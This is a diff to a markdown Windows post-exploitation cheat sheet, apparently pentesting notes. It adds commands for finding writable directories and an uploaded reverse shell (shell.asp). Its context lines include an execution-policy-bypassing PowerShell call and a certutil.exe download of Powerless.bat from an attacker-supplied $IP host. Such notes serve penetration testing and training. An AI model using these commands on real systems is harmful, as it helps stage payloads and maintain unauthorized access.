@@ -116,6 +116,22 @@ powershell -ExecutionPolicy ByPass -command "& { . whoami }"
 [Back](#summary)
 
 ## Transfer files
+### Writable Dirs
+* Common Directories
+```
+C:\WINDOWS\Temp
+C:\Inetpub\wwwroot
+```
+* Look for place reverse shell was uploaded
+```
+dir shell.asp /s /p
+```
+* Look for all writeable dirs (LOTS OF OUTPUTS)
+```
+dir /a-r-d /s /b
+```
+
+### Methods
 * certutil.exe
 ```
 certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat
